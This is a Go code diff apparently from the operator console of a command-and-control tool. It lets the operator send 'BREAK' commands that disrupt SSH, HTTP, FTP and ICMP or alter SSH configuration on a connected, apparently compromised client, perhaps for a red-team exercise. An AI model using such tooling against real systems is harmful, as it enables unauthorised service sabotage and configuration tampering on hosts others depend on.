@@ -288,22 +288,26 @@ func readStdin() {
 				if !IsActiveClient() {
 					errorln("Error: No active client")
 				}
-				breakList := strings.Split(cmd[6:], " ")
-				validBreaks := []string{
-					"icmp",
-					"ssh",
-					"http",
-					"nginx",
-					"apache2",
-				}
-				var breakSend []string
-				for i, brk := range breakList {
-					if contains(validBreaks, brk) {
-						breakSend = append(breakSend, brk)
-					} else {
-						errorf("Error at index %d: Unknown break", i)
+				activeClient := globalMap.GetActiveChannel()
+				client := globalMap.GetClient(activeClient)
+				if client.isEncoded {
+					breakList := strings.Split(cmd[6:], " ")
+					valids := []string{
+						"icmp",
+						"ftp",
+						"ssh",
+						"ssh.alter-config",
+						"ssh.move-config",
+						"ssh.break-service",
+						"http",
 					}
+					breakSend := CreateCommandList(breakList, "BREAK", valids)
+					SendMessage(breakSend, client.conn)
+				} else {
+					errorln("Error: Can only use break with encoded clients")
+					caret()
 				}
+
 			} else {
 				errorln("Please input a break")
 			}
@@ -335,6 +339,19 @@ func readStdin() {
 		//
 		// }
 	}
+}
+
+func CreateCommandList(breakList []string, typ string, valids []string) string {
+	var arr []string
+	for i, brk := range breakList {
+		if contains(valids, brk) {
+			arr = append(arr, brk)
+		} else {
+			errorf("Error at index %d: Unknown %s", i, strings.ToLower(typ))
+		}
+	}
+	send := typ + ":{" + strings.Join(arr, ",") + "}"
+	return send
 }
 
 func handleCommand(cmd string) (bool, int) {
